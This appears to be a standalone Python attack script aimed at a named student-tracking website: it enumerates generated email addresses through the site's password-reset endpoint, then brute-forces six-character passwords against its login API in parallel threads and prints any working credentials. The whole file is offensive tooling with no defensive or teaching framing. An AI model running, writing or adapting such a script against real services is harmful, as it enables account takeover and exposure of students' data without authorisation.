import requests
import itertools
import string
from concurrent.futures import ThreadPoolExecutor

def emailMaker():
    characters = string.ascii_letters + string.digits + '._%+-'
    domains = ['@gmail.com', '@icloud.com', '@naver.com', '@tsicscommunity.com']
    for length in range(2, 41):
        permutations = itertools.permutations(characters, length)
        for permutation in permutations:
            username = ''.join(permutation)
            for domain in domains:
                yield f"{username}{domain}"

def codeMaker():
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for code in itertools.product(chars, repeat=6):
        yield "".join(code)

def checkEmail(email):
    url = "https://www.revera-track.com/api/auth/forgot"
    payload = {
        "isFrontend": 1,
        "email": email,
        "allowedLevels": [1],
        "appTarget": "student"
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200:
        if response.text.strip() == "1":
            return True
        elif response.text.strip() == "0":
            return False
        else:
            print("Unknown response:", response.text.strip())
            return False
    else:
        print("Request failed with status code:", response.status_code)
        return False

def checkCreds(email, password):
    url = "https://www.revera-track.com/api/auth/login"
    payload = {
        "email": email,
        "password": password,
        "allowedLevels": [1],
        "appTarget": "student"
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200 and response.json().get('logged_in'):
        return True
    else:
        return False

def process_email(email):
    print("Processing email:", email)
    if checkEmail(email):
        print("Email is valid:", email)
        for password in codeMaker():
            print("Checking password:", password)
            if checkCreds(email, password):
                print("Credentials found - email: {}, password:{}".format(email, password))
                return

# Number of worker threads in the thread pool
NUM_THREADS = 10

# Create a thread pool executor
executor = ThreadPoolExecutor(max_workers=NUM_THREADS)

# Submit tasks to the executor
for email in emailMaker():
    executor.submit(process_email, email)

# Wait for all tasks to complete
executor.shutdown(wait=True)
